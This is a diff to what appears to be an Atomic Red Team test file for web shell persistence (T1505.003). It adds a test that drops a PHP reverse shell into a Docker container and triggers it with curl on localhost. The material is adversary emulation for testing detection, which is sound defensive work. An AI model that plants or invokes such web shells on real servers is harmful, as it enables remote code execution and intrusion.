@@ -51,10 +51,10 @@ atomic_tests:
       get_prereq_command: |
         echo "Install Docker from https://docs.docker.com/get-docker/"
   input_arguments:
-    web_shells:
-      description: Path of Web Shell
+    web_shell:
+      description: Path to shell
       type: path
-      default: PathToAtomicsFolder/T1505.003/src
+      default: PathToAtomicsFolder/T1505.003/src/shell.php
     web_shell_cmd:
       description: The command to execute from web shell
       type: string
@@ -64,8 +64,6 @@ atomic_tests:
     name: bash
     elevation_required: false
     command: |
-      # Remove existing shell to simulate dropping of a new one
-      rm -r /tmp/t1505_003 2>/dev/null
       mkdir -p /tmp/t1505_003
 
       docker stop t1505_003_container 2>/dev/null || : 
@@ -76,7 +74,7 @@ atomic_tests:
       sleep 3
     
       # Simulate web shell dropping
-      cp #{web_shells}/shell.php /tmp/t1505_003/shell.php
+      cp #{web_shell} /tmp/t1505_003/shell.php
 
       # Host can be configured via HTTP_SERVER_NAME / HTTPS_SERVER_NAME
       # See details at https://github.com/eriksoderblom/alpine-apache-php
@@ -87,4 +85,50 @@ atomic_tests:
       docker stop t1505_003_container
     cleanup_command: |
       rm -r /tmp/t1505_003
+      docker rmi eriksoderblom/alpine-apache-php:24.01
+
+- name: Invoke Reverse Shell in Dockerized PHP Server
+  auto_generated_guid: d526961d-dc60-42d8-a2a4-1a007819f98e
+  description: |
+    Starts a PHP server using Docker, copies a reverse shell into it, invokes request to achieve remote code execution (RCE), and then stops the container.
+  supported_platforms:
+    - linux
+  dependencies:
+    - description: |
+        Requires Docker and docker-compose to be installed and the user to have permissions to use Docker.
+      prereq_command: |
+        which docker && which docker-compose
+      get_prereq_command: |
+        apt install docker.io docker-compose || echo "Install Docker from https://docs.docker.com/get-docker/"
+
+  input_arguments:
+    web_shell:
+      description: Path to reverse Web Shell
+      type: path
+      default: PathToAtomicsFolder/T1505.003/src/revshell.php
+    docker_compose_file:
+      description: Path to docker-compose file for emulation
+      type: path
+      default: PathToAtomicsFolder/T1505.003/src/docker-compose.yml
+  dependency_executor_name: bash
+  executor:
+    name: bash
+    elevation_required: false
+    command: |
+      mkdir -p /tmp/t1505_003
+      docker-compose -f #{docker_compose_file} up -d
+
+      # Wait for PHP server to get ready
+      sleep 2
+    
+      # Simulate web shell dropping
+      cp #{web_shell} /tmp/t1505_003/revshell.php
+
+      curl http://127.0.0.1:8080/revshell.php -H 'Host: www.example.com'
+
+      sleep 1
+
+      docker-compose -f #{docker_compose_file} down
+    cleanup_command: |
+      rm -r /tmp/t1505_003 2>/dev/null
       docker rmi eriksoderblom/alpine-apache-php:24.01
